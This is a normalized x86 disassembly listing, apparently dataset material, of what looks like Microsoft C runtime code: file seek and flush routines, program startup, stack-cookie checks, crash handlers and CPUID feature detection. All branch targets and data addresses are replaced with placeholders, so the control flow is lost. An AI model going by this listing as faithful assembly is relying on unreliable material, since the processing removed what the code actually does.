sub_41039b
push 0xc
push r--data
call sub_411a70
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov esi [ ebp + 0x14 ]
test esi esi
setne al
test eax eax
jne r-xdata
push esi
call sub_411879
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_410244
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410411
mov eax edi
jmp r-xdata
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
call sub_411ab5
retn
sub_410419
push ebp
mov ebp esp
mov eax 0x1020
call sub_413fc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x1020 ] ebx
test ebx ebx
jne r-xdata
push esi
push ebx
call sub_4121ca
mov esi eax
xor eax eax
pop ecx
mov [ ebp - 0x1018 ] esi
cmp [ ebx + 0x4 ] eax
jge r-xdata
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
push esi
call sub_413cf7
mov ecx eax
add esp 0xc
mov [ ebp - 0x1008 ] ecx
test ecx ecx
jns r-xdata
mov [ ebx + 0x4 ] eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40f682
leave
retn
mov edx esi
sar edx 0x5
mov [ ebp - 0x1010 ] edx
mov edx [ edx * 4 + rw-data ]
mov eax esi
and eax 0x1f
shl eax 0x6
mov [ ebp - 0x101c ] eax
mov dl [ eax + edx + 0x24 ]
add dl dl
sar dl 0x1
test [ ebx + 0xc ] 0x108
mov [ ebp - 0x1009 ] dl
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi [ ebx ]
push edi
mov edi esi
sub edi [ ebx + 0x8 ]
test [ ebx + 0xc ] 0x3
mov [ ebp - 0x1014 ] edi
je r-xdata
sub ecx [ ebx + 0x4 ]
mov eax ecx
jmp r-xdata
pop esi
test [ ebx + 0xc ] 0x80
jne r-xdata
cmp dl 0x1
jne r-xdata
test ecx ecx
jne r-xdata
call sub_410eb4
mov [ eax ] 0x16
jmp r-xdata
mov edi [ ebp - 0x1010 ]
mov ecx [ edi * 4 + rw-data ]
mov edi [ ebp - 0x1014 ]
test [ eax + ecx + 0x4 ] 0x80
mov ecx [ ebp - 0x1008 ]
je r-xdata
mov edi [ ebp - 0x1010 ]
mov ecx [ edi * 4 + rw-data ]
mov edi [ ebp - 0x1014 ]
cmp [ eax + ecx + 0x30 ] 0x0
mov ecx [ ebp - 0x1008 ]
je r-xdata
test [ ebx + 0xc ] 0x1
je r-xdata
mov eax edi
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebx + 0x8 ]
mov [ ebp - 0x1014 ] ecx
cmp ecx esi
mov ecx [ ebp - 0x1008 ]
jae r-xdata
shr edi 0x1
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp dl 0x1
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
pop edi
mov eax [ ebp - 0x1014 ]
mov edx [ ebp - 0x1010 ]
mov ebx [ ebp - 0x1018 ]
mov ecx [ edx * 4 + rw-data ]
push 0x0
push [ eax + ecx + 0x2c ]
push [ eax + ecx + 0x28 ]
push ebx
call sub_413e4b
mov ecx [ ebp - 0x101c ]
mov esi eax
mov eax [ ebp - 0x1010 ]
add esp 0x10
mov eax [ eax * 4 + rw-data ]
cmp esi [ ecx + eax + 0x28 ]
jne r-xdata
mov eax ecx
jmp r-xdata
lea eax [ edi + ecx ]
shr edi 0x1
sub esi [ ebx + 0x8 ]
add esi [ ebx + 0x4 ]
mov ebx [ ebp - 0x1010 ]
mov ecx [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x1020 ]
test [ eax + ecx + 0x4 ] 0x80
mov ecx [ ebp - 0x1008 ]
je r-xdata
xor edi edi
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
inc edi
cmp edx [ ecx + eax + 0x2c ]
jne r-xdata
sub ecx esi
push 0x2
push 0x0
push [ ebp - 0x1018 ]
call sub_413cf7
mov ecx [ ebp - 0x1008 ]
add esp 0xc
cmp eax ecx
jne r-xdata
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x101c ]
push 0x0
lea edx [ ebp - 0x1014 ]
push edx
push 0x1000
lea edx [ ebp - 0x1004 ]
push edx
push [ ecx + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push 0x0
push ecx
push [ ebp - 0x1018 ]
call sub_413cf7
add esp 0xc
test eax eax
jns r-xdata
mov eax [ ebx + 0x8 ]
lea edx [ eax + esi ]
jmp r-xdata
push 0x0
push [ ebp - 0x1008 ]
push ebx
call sub_413cf7
add esp 0xc
test eax eax
js r-xdata
mov eax 0x200
cmp esi eax
ja r-xdata
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x1014 ]
cmp edi eax
ja r-xdata
mov esi [ ebx + 0x18 ]
test [ ebx + 0xc ] 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ ebx + 0xc ] 0x2000
jmp r-xdata
lea ecx [ ebp - 0x1004 ]
test edi edi
je r-xdata
mov dl [ ebp - 0x1009 ]
cmp dl 0x1
jne r-xdata
inc esi
test [ ebx + 0xc ] 0x400
mov esi eax
je r-xdata
inc eax
inc esi
je r-xdata
lea eax [ ebp - 0x1004 ]
sub esi eax
lea eax [ ecx + esi ]
jmp r-xdata
mov edx ecx
add edx eax
shr esi 0x1
mov eax [ ebp - 0x1010 ]
mov ecx [ ebp - 0x101c ]
mov eax [ eax * 4 + rw-data ]
test [ ecx + eax + 0x4 ] 0x4
mov ecx [ ebp - 0x1008 ]
mov al [ ecx ]
cmp al 0xd
jne r-xdata
movzx eax al
movsx eax [ eax + rw-data ]
add ecx eax
lea eax [ edx - 0x1 ]
cmp ecx eax
jae r-xdata
dec edi
cmp ecx edx
jae r-xdata
inc ecx
test edi edi
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov ecx eax
jmp r-xdata
sub_410772
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
and eax 0xffffffef
push edi
mov [ esi + 0xc ] eax
cmp ebx 0x1
jne r-xdata
call sub_410eb4
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
mov edi [ ebp + 0xc ]
push esi
call sub_410419
mov edi [ ebp + 0xc ]
add edi eax
pop ecx
xor ebx ebx
jmp r-xdata
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push esi
call sub_413ba6
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push ebx
push edi
push esi
call sub_4121ca
pop ecx
push eax
call sub_413cf7
add esp 0xc
xor ecx ecx
cmp eax 0xffffffff
setne cl
pop edi
pop ebx
lea eax [ ecx - 0x1 ]
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_410801
push 0xc
push r--data
call sub_411a70
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
or eax 0xffffffff
jmp r-xdata
push esi
call sub_411879
pop ecx
and [ ebp - 0x4 ] 0x0
push edi
push [ ebp + 0xc ]
push esi
call sub_410772
add esp 0xc
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410878
mov eax edi
cmp edi 0x1
je r-xdata
call sub_411ab5
retn
cmp edi 0x2
jne r-xdata
sub_41088e
push ebp
mov ebp esp
lea eax [ ecx + 0x9 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0x9
push eax
call sub_4142a0
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_4108ac
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_410880
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_40f691
pop ecx
sub_4108cb
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_413ba6
push esi
mov edi eax
call sub_414501
push esi
call sub_4121ca
push eax
call sub_41439d
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
cmp [ esi + 0x1c ] 0x0
je r-xdata
or edi 0xffffffff
jmp r-xdata
push [ esi + 0x1c ]
call sub_40f691
and [ esi + 0x1c ] 0x0
pop ecx
sub_410937
push 0xc
push r--data
call sub_411a70
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
push esi
call sub_411879
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_4108cb
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4109a6
jmp r-xdata
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
call sub_411ab5
retn
sub_4109d4
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40f6c9
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_410f1d
pop ecx
test eax eax
je r-xdata
leave
retn
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] r--data
call sub_414556
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_41465e
int3
sub_410a23
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_414594
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_40f691
pop ecx
sub_410a48
push 0xc
push r--data
call sub_411a70
and [ ebp - 0x1c ] 0x0
xor eax eax
mov edi [ ebp + 0x8 ]
test edi edi
setne al
test eax eax
jne r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
test ebx ebx
setne al
test eax eax
je r-xdata
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
xor eax eax
cmp [ ebx ] al
setne al
test eax eax
je r-xdata
call sub_411ab5
retn
call sub_41194f
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ edi ] 0x0
jne r-xdata
call sub_410eb4
mov [ eax ] 0x18
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push ebx
push edi
call sub_4146b9
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410b04
mov eax edi
call sub_410eb4
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_411c70
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_410b21
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
push 0x0
add ecx 0x2ac18000
push 0x989680
adc eax 0xfe624e21
push eax
push ecx
call sub_414940
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_410b70
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x10
pop ebp
retn
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
xor eax eax
pop ebp
retn
sub_410bc9
push 0x14
push r--data
call sub_411a70
call sub_415371
movzx esi ax
push 0x2
call sub_415171
pop ecx
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
mov [ ebp - 0x1c ] ebx
call sub_410f08
test eax eax
jne r-xdata
xor ebx ebx
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_414c19
test eax eax
jne r-xdata
push 0x1c
call sub_410d19
cmp [ eax + r--data ] ebx
setne bl
call sub_415258
and [ ebp - 0x4 ] 0x0
call sub_413feb
test eax eax
jns r-xdata
push 0x10
call sub_410d19
call [ GetCommandLineW@IAT ]
mov [ rw-data ] eax
call sub_415298
mov [ rw-data ] eax
call sub_414e56
test eax eax
jns r-xdata
push 0x1b
call sub_410d19
call sub_41508f
test eax eax
jns r-xdata
push 0x8
call sub_411048
push 0x1
call sub_411082
pop ecx
test eax eax
je r-xdata
push 0x9
call sub_411048
call sub_415648
push esi
push eax
push 0x0
push __dos_header
call sub_40c840
mov esi eax
mov [ ebp - 0x24 ] esi
test ebx ebx
jne r-xdata
push eax
call sub_411048
call sub_411073
jmp sub_410d0a
push esi
call sub_4112de
sub_410d4a
push ebp
mov ebp esp
call [ IsDebuggerPresent@IAT ]
push 0x1
mov [ rw-data ] eax
call sub_415695
push [ ebp + 0x8 ]
call sub_415632
cmp [ rw-data ] 0x0
pop ecx
pop ecx
jne r-xdata
push 0xc0000409
call sub_41561d
pop ecx
pop ebp
retn
push 0x1
call sub_415695
pop ecx
sub_410d87
push ebp
mov ebp esp
sub esp 0x324
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x324 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov [ eax + rw-data ] 0x2
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push 0x4
pop eax
shl eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push r--data
call sub_410d4a
leave
retn
push 0x2
pop ecx
int 0x29
sub_410e93
push ebp
mov ebp esp
push esi
call sub_410e80
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_410ec7
pop ecx
mov esi eax
call sub_410eb4
mov [ eax ] esi
pop esi
pop ebp
retn
sub_410ec7
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + rw-data ]
pop ebp
retn
inc eax
cmp eax 0x2d
jb r-xdata
cmp ecx [ eax * 8 + rw-data ]
je r-xdata
lea eax [ ecx - 0x13 ]
cmp eax 0x11
ja r-xdata
lea eax [ ecx - 0xbc ]
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_410f1d
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_410f50
push ebp
mov ebp esp
push ecx
push ebx
xor ebx ebx
push esi
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_410eb4
push 0x16
pop esi
mov [ eax ] esi
call sub_41179e
mov eax esi
jmp r-xdata
call sub_415392
test eax eax
jne r-xdata
pop esi
pop ebx
leave
retn
xor eax eax
push eax
push eax
push 0xffffffff
push [ ebp + 0x8 ]
mov [ esi ] eax
push eax
push ebx
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
call [ AreFileApisANSI@IAT ]
test eax eax
jne r-xdata
add eax eax
push eax
call sub_412014
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_410e93
xor ebx ebx
inc ebx
xor eax eax
jmp r-xdata
push [ ebp - 0x4 ]
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push 0x0
push ebx
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
xor eax eax
inc eax
call [ GetLastError@IAT ]
push eax
call sub_410e93
push [ esi ]
call sub_40f691
and [ esi ] 0x0
pop ecx
jmp r-xdata
pop ecx
sub_411000
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x0
call [ GetModuleHandleExW@IAT ]
test eax eax
je r-xdata
leave
retn
push r--data
push [ ebp - 0x4 ]
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_411082
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_415961
push r--data
push r--data
call sub_41117b
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_415870
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_415278
call sub_40ff91
pop ecx
mov esi r--data
mov edi r--data
jmp r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
add esi 0x4
call eax
xor eax eax
push rw-data
call sub_415870
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_411127
push esi
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
push esi
call sub_410f43
push esi
call sub_411766
push esi
call sub_412bf9
push esi
call sub_415a10
push esi
call sub_415a2a
push esi
call sub_4159ff
add esp 0x18
pop esi
jmp sub_4153d0
sub_41115f
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_41117b
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_4111af
push 0x1c
push r--data
call sub_411a70
push 0x8
call sub_41569d
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x1
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4112c9
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] 0x1
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_411ab5
retn
mov [ rw-data ] 0x1
push 0x8
call sub_415801
pop ecx
push [ ebp + 0x8 ]
call sub_411032
push r--data
push r--data
call sub_41115f
pop ecx
pop ecx
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
je r-xdata
push r--data
push r--data
call sub_41115f
pop ecx
pop ecx
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] edi
push 0x0
call [ EncodePointer@IAT ]
cmp [ edi ] eax
je r-xdata
sub edi 0x4
mov [ ebp - 0x24 ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
push [ edi ]
call esi
mov esi eax
push 0x0
call [ EncodePointer@IAT ]
mov [ edi ] eax
call esi
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov [ ebp - 0x28 ] eax
push [ rw-data ]
call esi
mov ecx [ ebp - 0x28 ]
cmp [ ebp - 0x1c ] ecx
jne r-xdata
mov [ ebp - 0x1c ] ecx
mov ebx ecx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x20 ] eax
mov edi eax
jmp r-xdata
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x24 ] edi
sub_4112f2
push 0x3
call sub_41517e
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_41134f
push 0xff
call sub_41134f
pop ecx
pop ecx
push 0x3
call sub_41517e
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_41132b
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x17
jb r-xdata
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_41134f
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_41132b
mov edi eax
pop ecx
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40f682
leave
retn
push ebx
push 0x3
call sub_41517e
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x3
call sub_41517e
pop ecx
test eax eax
jne r-xdata
pop ebx
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor ebx ebx
mov ecx ebx
push r--data
push 0x314
push rw-data
call sub_40fe10
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_416340
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc ecx
cmp ecx 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_4117ae
int3
push 0x104
push rw-data
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov esi 0x2fb
test eax eax
jne r-xdata
mov al [ edi + ecx * 2 ]
mov [ ebp + ecx - 0x1f8 ] al
cmp [ edi + ecx * 2 ] bx
je r-xdata
push rw-data
call sub_4163cb
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push esi
push rw-data
call sub_40fe10
add esp 0xc
test eax eax
jne r-xdata
push r--data
push 0x314
mov esi rw-data
push esi
call sub_40fda4
add esp 0xc
test eax eax
jne r-xdata
push rw-data
call sub_4163cb
lea ecx [ eax * 2 + rw-data ]
mov eax ecx
sub eax rw-data
push 0x3
sar eax 0x1
push r--data
sub esi eax
push esi
push ecx
call sub_4163e4
add esp 0x14
test eax eax
jne r-xdata
push edi
push 0x314
push esi
call sub_40fda4
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push esi
call sub_4164a2
add esp 0xc
jmp r-xdata
sub_41150a
push ebp
mov ebp esp
and [ rw-data ] 0x0
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
or [ rw-data ] ebx
push 0xa
call IsProcessorFeaturePresent
test eax eax
je r-xdata
xor eax eax
pop ebx
leave
retn
xor ecx ecx
mov eax ebx
mov [ rw-data ] ebx
cpuid
push esi
mov esi [ rw-data ]
push edi
lea edi [ ebp - 0x10 ]
or esi 0x2
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
test [ ebp - 0x8 ] 0x100000
mov [ rw-data ] esi
je r-xdata
test [ ebp - 0x8 ] 0x10000000
je r-xdata
or esi 0x4
mov [ rw-data ] 0x2
mov [ rw-data ] esi
push 0x7
xor ecx ecx
pop eax
cpuid
lea esi [ ebp - 0x10 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
test [ ebp - 0xc ] 0x200
mov esi [ rw-data ]
je r-xdata
or esi 0x8
mov [ rw-data ] 0x3
mov [ rw-data ] esi
xor eax eax
xor ecx ecx
cpuid
lea edi [ ebp - 0x10 ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
cmp [ ebp - 0xc ] 0x756e6547
jne r-xdata
or esi 0x2
mov [ rw-data ] esi
pop edi
pop esi
cmp [ ebp - 0x4 ] 0x49656e69
jne r-xdata
cmp [ ebp - 0x8 ] 0x6c65746e
jne r-xdata
xor eax eax
inc eax
xor ecx ecx
cpuid
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov eax [ ebp - 0x10 ]
and eax 0xfff3ff0
cmp eax 0x106c0
je r-xdata
or esi 0x1
mov [ rw-data ] esi
cmp eax 0x20660
je r-xdata
cmp eax 0x20670
je r-xdata
cmp eax 0x30650
je r-xdata
cmp eax 0x30660
je r-xdata
cmp eax 0x30670
jne r-xdata
sub_411643
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0xffffffff
push edi
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_412270
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x218 ] eax
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov eax [ eax - 0x4 ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x320 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x31c ] eax
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
mov edi eax
lea eax [ ebp - 0x328 ]
push eax
call sub_415632
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_415695
pop ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40f682
leave
retn
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
call sub_415695
pop ecx
sub_411773
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4117ae
int3
pop ebp
jmp eax
sub_4117ae
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_411643
push esi
call sub_41561d
add esp 0x10
pop esi
retn
push 0x5
pop ecx
int 0x29
sub_4117d9
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_411fca
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_411fca
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ rw-data ]
jmp r-xdata
push 0x1a
pop eax
pop esi
retn
mov [ edx + eax ] ecx
add ecx 0x20
lea edx [ edx + 0x4 ]
cmp ecx rw-data
jge r-xdata
sub_411879
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov ecx rw-data
cmp esi ecx
jb r-xdata
lea eax [ esi + 0x20 ]
push eax
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov eax esi
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_41569d
or [ esi + 0xc ] 0x8000
